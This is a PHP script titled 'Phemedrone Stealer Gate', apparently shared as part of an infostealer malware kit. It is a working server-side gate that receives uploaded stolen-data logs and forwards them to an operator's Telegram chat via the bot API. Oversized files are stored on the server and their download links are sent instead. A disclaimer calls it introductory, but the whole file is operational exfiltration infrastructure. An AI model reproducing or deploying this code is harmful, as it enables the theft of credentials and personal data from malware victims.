<?php
/*
	Phemedrone Stealer Gate
	Coded by https://t.me/reyvortex & https://t.me/TheDyer
	!WARNING! ALL CODE IS FOR INTRODUCTORY PURPOSES WE ARE NOT RESPONSIBLE FOR WHAT YOU HAVE DONE !WARNING!
*/
define('BOT_TOKEN', 'YOUR TELEGRAM BOT TOKEN'); // Replace YOUR TELEGRAM BOT TOKEN to Your BotToken
define('CHAT_ID', 'YOUR CHAT ID'); // Replace YOUR CHAT ID to Your Chat ID

$uploadPath = __DIR__ . '/logs/';

if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $fileName = $_FILES['file']['name'];
    $fileSize = $_FILES['file']['size'];
    $fileTmp = $_FILES['file']['tmp_name'];
    $fileCaption = $_POST['filedescription'] ?? '';
    $fileCaption = trim($fileCaption); // Remove leading/trailing whitespace

    if ($fileSize <= 50 * 1024 * 1024) {
        $telegramApiUrl = 'https://api.telegram.org/bot' . BOT_TOKEN . '/sendDocument';

        $fileContents = file_get_contents($fileTmp);
        $fileData = [
            'chat_id' => CHAT_ID,
            'document' => new CURLFile($fileTmp, '', $fileName),
            'caption' => $fileCaption
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $fileData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $telegramResponse = curl_exec($ch);
        curl_close($ch);

        // Handle Telegram response if needed
        // ...

        echo 'File has been successfully uploaded to Telegram.';
    } else {
        $uploadFilePath = $uploadPath . $fileName;
        move_uploaded_file($fileTmp, $uploadFilePath);

        $fileUrl = 'http://' . $_SERVER['HTTP_HOST'] . '/logs/' . $fileName;
        $message = "Download URL: " . $fileUrl . "\n";
        $message .= "Info: " . $fileCaption;

        $telegramApiUrl = 'https://api.telegram.org/bot' . BOT_TOKEN . '/sendMessage';
        $postData = [
            'chat_id' => CHAT_ID,
            'text' => $message
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $telegramResponse = curl_exec($ch);
        curl_close($ch);

        // Handle Telegram response if needed
        // ...

        echo 'File has been saved on the server. Telegram link has been sent.';
    }
} else {
    echo 'Error uploading the file.';
}
?>
